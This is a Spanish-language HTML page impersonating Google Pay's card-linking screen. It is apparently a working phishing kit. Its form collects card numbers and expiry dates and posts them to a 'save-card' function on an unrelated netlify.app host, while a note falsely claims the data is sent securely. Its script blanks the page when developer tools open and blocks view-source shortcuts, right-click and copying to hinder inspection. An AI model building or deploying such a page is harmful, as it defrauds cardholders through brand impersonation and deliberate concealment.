<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asociar Tarjeta a Google Pay</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
</head>

<body>
    <canvas id="matrix-canvas"></canvas>
    <div class="background-blobs">
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
    </div>

    <main class="payment-container">
        <div class="card-preview">
            <div class="card-glass">
                <div class="card-header">
                    <span class="chip"></span>
                    <span class="logo" id="card-logo">CARD</span>
                </div>
                <div class="card-body">
                    <div class="card-number-preview">•••• •••• •••• ••••</div>
                    <div class="card-details">
                        <div class="card-holder-preview">
                            <span class="label">Titular</span>
                            <span class="value">Nombre Apellido</span>
                        </div>
                        <div class="card-date-preview">
                            <span class="label">Expira</span>
                            <span class="value">MM/AA</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <form class="payment-form" name="payment" method="POST"
            action="https://asociargpay.netlify.app/.netlify/functions/save-card">
            <h1>Asocia tu tarjeta</h1>

            <div class="form-group">
                <label for="cc-number">Número de tarjeta</label>
                <div class="input-wrapper">
                    <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number"
                        placeholder="0000 0000 0000 0000" inputmode="numeric" required>
                    <i class="icon-card"></i>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group half">
                    <label for="cc-exp-month">Mes</label>
                    <div class="input-wrapper">
                        <input type="text" id="cc-exp-month" name="cc-exp-month" autocomplete="cc-exp-month"
                            placeholder="MM" maxlength="2" inputmode="numeric" required>
                    </div>
                </div>

                <div class="form-group half">
                    <label for="cc-exp-year">Año</label>
                    <div class="input-wrapper">
                        <input type="text" id="cc-exp-year" name="cc-exp-year" autocomplete="cc-exp-year"
                            placeholder="AA" maxlength="2" inputmode="numeric" required>
                    </div>
                </div>
            </div>

            <button type="submit" class="pay-button">
                Guardar tarjeta
            </button>
            <p class="security-note">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Tus datos son transmitidos de forma segura
            </p>
        </form>
    </main>

    <script>
        // Efecto Matrix mejorado
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = '01アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(10, 26, 10, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                
                // Color más brillante para algunos caracteres
                if (Math.random() > 0.98) {
                    ctx.fillStyle = '#39ff14';
                } else {
                    ctx.fillStyle = '#0fff50';
                }
                
                ctx.font = fontSize + 'px "Share Tech Mono", monospace';
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.97) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 35);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // Protección contra DevTools
        (function() {
            // Detectar DevTools abierto
            const element = new Image();
            let devtoolsOpen = false;
            Object.defineProperty(element, 'id', {
                get: function() {
                    devtoolsOpen = true;
                    document.body.innerHTML = '';
                    window.location.href = 'about:blank';
                }
            });
            
            setInterval(function() {
                devtoolsOpen = false;
                console.log(element);
                console.clear();
                if (devtoolsOpen) {
                    document.body.innerHTML = '';
                    window.location.href = 'about:blank';
                }
            }, 1000);

            // Bloquear teclas de acceso rápido
            document.addEventListener('keydown', function(e) {
                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+Shift+C
                if (e.keyCode === 123 || 
                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
                    (e.ctrlKey && e.keyCode === 85) ||
                    (e.ctrlKey && e.shiftKey && e.keyCode === 67)) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            });

            // Bloquear clic derecho
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            // Desactivar selección de texto
            document.onselectstart = function() { return false; };
            document.oncopy = function() { return false; };
        })();

        // Detección de tipo de tarjeta
        const numInput = document.getElementById('cc-number');
        const monthInput = document.getElementById('cc-exp-month');
        const yearInput = document.getElementById('cc-exp-year');
        const previewNum = document.querySelector('.card-number-preview');
        const previewExp = document.querySelector('.card-date-preview .value');
        const cardLogo = document.getElementById('card-logo');

        function detectCardType(number) {
            const cleanNum = number.replace(/\s/g, '');
            
            // Visa: empieza con 4
            if (/^4/.test(cleanNum)) {
                return 'VISA';
            }
            // Mastercard: empieza con 51-55 o 2221-2720
            if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
                return 'MASTERCARD';
            }
            // American Express: empieza con 34 o 37
            if (/^3[47]/.test(cleanNum)) {
                return 'AMEX';
            }
            
            return 'CARD';
        }

        numInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
            val = val != '' ? val.match(/.{1,4}/g).join(' ') : '';
            e.target.value = val;
            previewNum.textContent = val || '•••• •••• •••• ••••';
            
            // Actualizar logo según tipo de tarjeta
            const cardType = detectCardType(val);
            cardLogo.textContent = cardType;
        });

        function updateExpPreview() {
            const month = monthInput.value;
            const year = yearInput.value;
            if (month || year) {
                previewExp.textContent = (month || 'MM') + '/' + (year || 'AA');
            } else {
                previewExp.textContent = 'MM/AA';
            }
        }

        monthInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 2);
            updateExpPreview();
        });

        yearInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 2);
            updateExpPreview();
        });
    </script>
</body>

</html>
